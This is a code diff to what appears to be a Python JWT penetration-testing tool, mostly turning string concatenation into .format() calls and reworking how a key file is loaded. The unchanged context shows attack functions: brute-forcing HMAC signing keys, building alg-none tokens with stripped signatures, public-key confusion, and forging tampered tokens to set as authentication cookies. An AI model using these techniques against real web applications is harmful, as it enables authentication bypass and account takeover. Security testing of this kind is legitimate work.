@@ -31,7 +31,7 @@ def checkSig(sig, contents):
 
 def checkSigKid(sig, contents,key_file):
 	quiet = False
-	print("File loaded: "+keyList)
+	print("File loaded: {0}".format(key_file))
 	testKey(key_file, sig, contents, headDict, quiet)
 
 def crackSig(sig, contents,num_lines,key_list):
@@ -57,17 +57,17 @@ def testKey(key, sig, contents, headDict, quiet):
 	testSig = (base64.urlsafe_b64encode(testHash).decode('utf-8')).strip("=")
 	if testSig == sig:
 		if len(key) > 25:
-			print("[+] "+key[0:25]+"...(output trimmed) is the CORRECT key!")
+			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key[0:25]))
 		else:
-			print("[+] "+key+" is the CORRECT key!")
+			print("[+] {0} is the CORRECT key!".format(key))
 		exit(1)
 	else:
 		if quiet == False:
 			if len(key) > 25:
-				print("[-] "+key[0:25]+"...(output trimmed) is not the correct key")
+				print("[-] {0} ...(output trimmed) is not the correct key".format(key[0:25]))
 				#print("[-] "+key+"...(output trimmed) is not the correct key")
 			else:
-				print("[-] "+key+" is not the correct key")
+				print("[-] {0} is not the correct key".format(key))
 		return
 
 def buildHead(alg, headDict):
@@ -107,7 +107,7 @@ def checkCVE(headDict, tok2):
 	newHead = buildHead(alg, headDict)
 	CVEToken = newHead+"."+tok2+"."
 	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
-	print("\n"+CVEToken+"\n")
+	print("\n{0}\n".format(CVEToken))
 
 def checkPubKey(headDict, tok2):
 	print("\nPlease enter the Public Key filename:")
@@ -119,7 +119,7 @@ def checkPubKey(headDict, tok2):
 	newSig = base64.urlsafe_b64encode(newHmac)
 	newSig = (newSig.decode("utf-8")).strip("=")
 	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
-	print("\n"+newTok+"."+newSig)
+	print("\n{0}.{1}".format(newTok, newSig))
 
 def tamperToken(paylDict, headDict):
 	print("\nToken header values:")
@@ -128,7 +128,7 @@ def tamperToken(paylDict, headDict):
 		headList = [0]
 		for pair in headDict:
 			menuNum = i+1
-			print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
+			print("[{0}] {1} = {2}".format(menuNum, pair, headDict[pair]))
 			headList.append(pair)
 			i += 1
 		print("["+str(i+1)+"] *ADD A VALUE*")
@@ -140,14 +140,14 @@ def tamperToken(paylDict, headDict):
 		except:
 			selection = 0
 		if selection<len(headList) and selection>0:
-			print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
+			print("\nCurrent value of {0} is: {1}".format(headList[selection],headDict[headList[selection]]))
 			print("Please enter new value and hit ENTER")
 			newVal = input("> ")
 			headDict[headList[selection]] = newVal
 		elif selection == i+1:
 			print("Please enter new Key and hit ENTER")
 			newPair = input("> ")
-			print("Please enter new value for "+newPair+" and hit ENTER")
+			print("Please enter a new value for {0} and hit ENTER".format(newPair))
 			newVal = input("> ")
 			headList.append(newPair)
 			headDict[headList[selection]] = newVal
@@ -161,7 +161,7 @@ def tamperToken(paylDict, headDict):
 		paylList = [0]
 		for pair in paylDict:
 			menuNum = i+1
-			print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
+			print("[{0}] {1} = {2}".format(menuNum, pair, paylDict[pair]))
 			paylList.append(pair)
 			i += 1
 		print("[0] Continue to next step")
@@ -172,7 +172,7 @@ def tamperToken(paylDict, headDict):
 		except:
 			selection = 0
 		if selection<len(paylList) and selection>0:
-			print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
+			print("\nCurrent value of {0} is: {1}".format(paylList[selection], paylDict[paylList[selection]]))
 			print("Please enter new value and hit ENTER")
 			newVal = input("> ")
 			paylDict[paylList[selection]] = newVal
@@ -210,8 +210,8 @@ def tamperToken(paylDict, headDict):
 			keyLength = 256
 		newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
 		print("\nYour new forged token:")
-		print("[+] URL safe: "+newContents+"."+newSig)
-		print("[+] Standard: "+newContents+"."+badSig+"\n")
+		print("[+] URL safe: {0}.{1}".format(newContents,newSig))
+		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
 		exit(1)
 	elif selection == 2:
 		print("\nStripped Signature")
@@ -225,9 +225,16 @@ def tamperToken(paylDict, headDict):
 		checkPubKey(headDict, tok2)
 		exit(1)
 	if selection == 4:
-		print("\nLoading key file...")
-		key1 = open(keyList).read()
-		print("File loaded: "+keyList)
+		print("\nPlease enter the key filename:")
+		file_name= input(">")
+		try:
+			with open(file_name) as f:
+				key = f.read()
+				print("File loaded: {0}".format(file_name))
+		except FileNotFoundError:
+			print("[-] File {0} doesn't exists".format(file_name))
+			exit(1)
+			
 		print("\nPlease enter the keylength:")
 		print("[1] HMAC-SHA256")
 		print("[2] HMAC-SHA384")
@@ -242,10 +249,10 @@ def tamperToken(paylDict, headDict):
 			keyLength = 512
 		else:
 			keyLength = 256
-		newSig, badSig, newContents = signToken(headDict, paylDict, key1, keyLength)
+		newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
 		print("\nYour new forged token:")
-		print("[+] URL safe: "+newContents+"."+newSig)
-		print("[+] Standard: "+newContents+"."+badSig+"\n")
+		print("[+] URL safe: {0}.{1}".format(newContents,newSig))
+		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
 		exit(1)
 	else:
 		print("[-] Option not valid")
@@ -334,7 +341,7 @@ if __name__ == '__main__':
 			print("[-] File {0} doesn't exists".format(file_name))
 	elif selection == 5:
 		print("\nPlease enter the dictionary filename:")
-		file_name= input(">")
+		file_name= input("> ")
 		try:
 			with open(file_name) as f:
 				num_lines = sum(1 for line in open(file_name) if line.rstrip())
